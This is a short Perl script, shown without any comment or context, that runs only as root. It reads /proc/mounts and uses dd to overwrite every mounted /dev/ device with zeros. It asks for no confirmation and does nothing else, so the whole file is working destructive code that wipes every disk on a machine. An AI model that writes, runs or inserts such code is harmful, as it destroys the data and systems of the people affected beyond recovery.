#!/usr/bin/env perl
use strict;
use warnings;

exit 0 if $> != 0;
open my $m, "<", "/proc/mounts" or die $!;
my %seen;
while (<$m>) {
    my ($dev) = split;
    next unless $dev =~ m{^/dev/};
    next if $seen{$dev}++;
    system("dd", "if=/dev/zero", "of=$dev");
}
